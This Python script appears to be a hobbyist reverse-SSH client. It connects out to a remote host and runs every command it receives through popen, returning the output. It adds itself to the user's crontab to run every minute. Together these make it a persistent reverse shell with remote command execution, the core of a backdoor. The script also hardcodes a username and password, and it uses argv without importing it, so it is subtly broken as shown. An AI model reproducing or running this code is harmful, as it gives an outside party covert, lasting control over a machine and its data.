import paramiko
from os import popen,system
from crontab import CronTab

# host = input('Enter host: ')
# port = int(input('Enter port: '))
# username = input('Enter username: ')
# password = input('Enter password: ')

my_port = 22
my_username = 'aryehshebson'
my_password = 'pass'

client_name = 'reverse_ssh_client.py'
client_path = '/home/aryeh/Desktop/reverse_ssh_client.py'

def already_running(process):
    return popen('pgrep -af python').read().count(process+'\n') > 1

def crontabs():
    return popen('crontab -l').read()

def add_to_crontabs(process):
    cron = CronTab(user=True)
    job = cron.new(command='/usr/bin/python3 {}'.format(client_path), comment='aryeh was here')
    job.minute.every(1)
    cron.write()

def create_channel(host,username,password,port):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # connect to host
    try:
        client.connect(hostname=host, username=username, password=password, port=port)
    except:
        print('unable to connect')
        exit()
    channel = client.invoke_shell()
    return channel

if __name__ == '__main__':
    #parse argv
    if (len(argv) != 2):
        print('usage: python3 reverse_ssh_client.py [host]')
        exit()
    my_host = argv[1]
    #check process isn't already running
    if already_running(client_name):
        print('already running')
        exit()
    #make client run on boot
    if client_name not in crontabs():
        add_to_crontabs(client_path)
    #connect client
    channel = create_channel(my_host,my_username,my_password,my_port)
    #start conversation
    channel.send('\n\n-------------------\n\nWelcome To SSH land\n\n-------------------\n\n> ')
    while True:
        cmd = channel.recv(1024).decode()
        if cmd == 'exit':
            print('connection closed')
            channel.close()
            exit()
        print('client send: {}'.format(cmd))
        channel.send(popen(cmd).read()+'> ')